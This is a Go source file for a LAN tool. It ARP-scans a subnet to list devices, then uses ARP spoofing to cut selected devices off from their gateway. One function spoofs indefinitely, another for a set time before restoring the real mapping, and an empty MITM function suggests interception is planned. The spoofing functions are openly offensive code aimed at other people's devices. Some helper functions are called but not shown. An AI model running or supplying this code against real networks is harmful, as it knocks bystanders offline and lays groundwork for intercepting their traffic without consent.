package networkscan

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

type Device struct {
	IP  net.IP
	MAC net.HardwareAddr
	HOSTNAME []string
}

type NetworkScanner struct {
	handle   *pcap.Handle
	localIP  net.IP
	localMAC net.HardwareAddr
}

func NewNetworkScanner(ifaceName string) *NetworkScanner {
	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening device %s: %v", ifaceName, err)
	}

	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("Error getting interface %s: %v", ifaceName, err)
	}

	addrs, err := iface.Addrs()
	if err != nil {
		log.Fatalf("Error getting addresses for interface %s: %v", ifaceName, err)
	}

	localIP := addrs[0].(*net.IPNet).IP.To4()
	localMAC := iface.HardwareAddr

	return &NetworkScanner{
		handle:   handle,
		localIP:  localIP,
		localMAC: localMAC,
	}
}

func (ns *NetworkScanner) NetScan(targetNet string) []Device {
	_, ipNet, err := net.ParseCIDR(targetNet)
	if err != nil {
		log.Fatalf("Error parsing CIDR: %v", err)
	}
	fmt.Printf("Scanning network %s...\n", ipNet)

	// Create a channel to signal when the scan is done
	done := make(chan bool)
	defer close(done)

	go func() {
		for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); IncrementIP(ip) {
			if ip.Equal(ns.localIP) {
				continue
			}
			go SendARPRequest(ns.handle, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ns.localMAC, ns.localIP, ip)
			time.Sleep(250 * time.Millisecond) // Limit the rate of ARP requests
		}
		time.Sleep(1 * time.Second) 
		done <- true 
	}()

	fmt.Println("Waiting for responses...")

	packetSource := gopacket.NewPacketSource(ns.handle, ns.handle.LinkType())
	var devices []Device

	for {
		select {
		case packet := <-packetSource.Packets():
			device := HandleARPPacket(packet)
			if device.IP != nil && device.MAC != nil {
				devices = append(devices, device)
				fmt.Printf("Discovered device: IP=%s, MAC=%s, HOSTNAME: %s\n", device.IP, device.MAC, device.HOSTNAME)
			}
		case <-done: 
			fmt.Println("Stopping packet capture after scan completion.")
			return devices
		}
	}
}

// CutOffDevice sends ARP spoofing packets indefinitely to isolate a device.
func (ns *NetworkScanner) CutOffDevice(device Device, gateway string) {
	for {
		routerIp := net.ParseIP(gateway).To4()
		SendARPReply(ns.handle, device.MAC, device.IP, ns.localMAC, routerIp)
		time.Sleep(2 * time.Second)
	}
}

// CutOffDeviceFor isolates a device for the given duration, then restores it
// by sending the correct ARP mapping back to the device.
func (ns *NetworkScanner) CutOffDeviceFor(device Device, gateway string, duration time.Duration) {
	deadline := time.Now().Add(duration)
	routerIp := net.ParseIP(gateway).To4()
	for time.Now().Before(deadline) {
		SendARPReply(ns.handle, device.MAC, device.IP, ns.localMAC, routerIp)
		time.Sleep(2 * time.Second)
	}
	ns.RestoreDevice(device, gateway)
}

// RestoreDevice sends the correct ARP reply so the device re-learns the real
// gateway MAC address.  The scanner must still be able to reach the gateway
// (i.e. it knows the gateway MAC via a prior scan) – if not, it performs an
// ARP request for the gateway first.
func (ns *NetworkScanner) RestoreDevice(device Device, gateway string) {
	routerIp := net.ParseIP(gateway).To4()
	if routerIp == nil {
		return
	}
	// Try to resolve gateway MAC via ARP scan of a /32 prefix.
	gwDevices := ns.NetScan(gateway + "/32")
	var gwMAC net.HardwareAddr
	for _, d := range gwDevices {
		if d.IP.Equal(routerIp) {
			gwMAC = d.MAC
			break
		}
	}
	if gwMAC == nil {
		// Cannot resolve gateway MAC; skip restore to avoid misleading the target.
		return
	}
	// Send 3 gratuitous ARPs so the target definitely re-learns the mapping.
	for i := 0; i < 3; i++ {
		SendARPReply(ns.handle, device.MAC, device.IP, gwMAC, routerIp)
		time.Sleep(500 * time.Millisecond)
	}
}

func MITM(device Device) {
}

func (ns *NetworkScanner) Close() {
	ns.handle.Close()
}

